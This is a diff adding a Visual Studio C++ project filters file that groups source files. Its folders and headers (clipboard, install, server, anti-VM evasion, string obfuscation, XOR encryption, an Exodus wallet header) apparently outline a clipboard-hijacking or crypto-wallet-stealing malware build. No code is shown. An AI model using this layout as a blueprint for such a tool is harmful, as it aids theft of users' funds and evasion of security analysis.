@@ -1,0 +1,85 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup>
+    <Filter Include="Source">
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
+    </Filter>
+    <Filter Include="Source\Main">
+      <UniqueIdentifier>{cfb226c5-eddd-46f5-8fd8-c87db16e586a}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source\Fortmat">
+      <UniqueIdentifier>{41fddf58-d881-41e1-92aa-fa421c60f138}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source\Clip">
+      <UniqueIdentifier>{d7fe1b0f-7955-4655-bd7c-70615eac31a7}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source\Settings">
+      <UniqueIdentifier>{330f47f6-c224-4cd1-9cf6-389f9f093462}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source\Install">
+      <UniqueIdentifier>{48b19ba0-2e57-4af2-9171-456e5954d66d}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source\Server">
+      <UniqueIdentifier>{426082fa-bd81-4267-b1b0-b829977405b3}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source\Evasion">
+      <UniqueIdentifier>{f5b96020-2db4-470f-8f5c-c15edc46cb64}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source\Evasion\AntiVM">
+      <UniqueIdentifier>{6d9e9cc8-86ae-45eb-b666-f1282bc8b771}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source\Oxorany">
+      <UniqueIdentifier>{c855767a-9d26-44ea-9082-044314a9c3b7}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source\Encryption">
+      <UniqueIdentifier>{6f5b4d4a-4828-48b9-ba29-f5c56ae45b37}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source\Wallets">
+      <UniqueIdentifier>{916cf4bb-985e-4c7c-8bd7-9179bf98cd54}</UniqueIdentifier>
+    </Filter>
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="main.cpp">
+      <Filter>Source\Main</Filter>
+    </ClCompile>
+    <ClCompile Include="oxorany.cpp">
+      <Filter>Source\Oxorany</Filter>
+    </ClCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="format.h">
+      <Filter>Source\Fortmat</Filter>
+    </ClInclude>
+    <ClInclude Include="clip.h">
+      <Filter>Source\Clip</Filter>
+    </ClInclude>
+    <ClInclude Include="settings.h">
+      <Filter>Source\Settings</Filter>
+    </ClInclude>
+    <ClInclude Include="install.h">
+      <Filter>Source\Install</Filter>
+    </ClInclude>
+    <ClInclude Include="server.h">
+      <Filter>Source\Server</Filter>
+    </ClInclude>
+    <ClInclude Include="anti_vm.h">
+      <Filter>Source\Evasion\AntiVM</Filter>
+    </ClInclude>
+    <ClInclude Include="oxorany.h">
+      <Filter>Source\Oxorany</Filter>
+    </ClInclude>
+    <ClInclude Include="oxorany_include.h">
+      <Filter>Source\Oxorany</Filter>
+    </ClInclude>
+    <ClInclude Include="xor.h">
+      <Filter>Source\Encryption</Filter>
+    </ClInclude>
+    <ClInclude Include="string.h">
+      <Filter>Source\Encryption</Filter>
+    </ClInclude>
+    <ClInclude Include="exodus.h">
+      <Filter>Source\Wallets</Filter>
+    </ClInclude>
+  </ItemGroup>
+</Project>
